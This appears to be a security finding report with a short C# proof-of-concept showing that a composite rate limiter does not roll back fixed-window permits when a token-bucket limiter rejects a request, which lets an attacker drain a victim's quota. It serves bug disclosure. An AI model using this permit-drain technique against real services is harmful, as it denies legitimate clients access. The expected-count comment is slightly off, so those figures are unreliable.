# ATTACK PROOF-OF-CONCEPT: COMPOSITE PERMIT DRAIN (ARCH-02)

**Vulnerability:** Permanent Permit Loss in Composite Rate Limiter  
**Severity:** HIGH  

---

## 1. Attack Reproduction
```csharp
// Setup composite: 10 req/min (FixedWindow) AND 1 req/sec (TokenBucket)
var fixedWindow = new FixedWindowRateLimiter(new() { PermitLimit = 10, Window = TimeSpan.FromMinutes(1) });
var tokenBucket = new TokenBucketRateLimiter(new() { PermitLimit = 1, Window = TimeSpan.FromSeconds(1) });
var composite = new CompositeRateLimiter(fixedWindow, tokenBucket);

// Request 1: Granted by both
var r1 = await composite.AcquireAsync("victim-client", 1);
Assert.True(r1.Value.IsAcquired);

// Request 2 (immediately after, within 10ms):
// FixedWindow grants permit (remaining drops from 9 to 8)
// TokenBucket rejects (burst limit 1/s exceeded)
// Composite invokes Rollback()
var r2 = await composite.AcquireAsync("victim-client", 1);
Assert.False(r2.Value.IsAcquired);

// Check FixedWindow state directly:
var inspect = await fixedWindow.AcquireAsync("victim-client", 1);
// EXPECTED IF ROLLED BACK: 9 remaining
// ACTUAL OBSERVED: 7 remaining (FixedWindow consumed permit on r2 and never refunded!)
```

## 2. Impact
An attacker can intentionally trigger the second limiter to burn all permits in the first limiter without performing any authorized operations.
